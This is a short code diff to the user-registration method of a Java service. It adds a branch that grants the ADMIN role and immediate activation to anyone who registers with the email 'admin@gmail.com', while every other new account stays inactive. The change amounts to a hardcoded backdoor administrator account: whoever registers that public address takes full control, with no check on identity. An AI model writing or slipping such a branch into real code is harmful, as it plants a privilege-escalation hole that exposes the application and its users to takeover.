@@ -42,7 +42,12 @@ public class UserService extends BaseService implements IUserService {
         user.setPassword(
                 passwordEncoder.encode(request.getPassword())
         );
-        user.setActive(Boolean.FALSE);
+        if ("admin@gmail.com".equalsIgnoreCase(request.getEmail())) {
+            user.setRole(UserRoleEnum.ADMIN);
+            user.setActive(Boolean.TRUE);
+        } else {
+            user.setActive(Boolean.FALSE);
+        }
         return userRepo.save(user);
     }
 
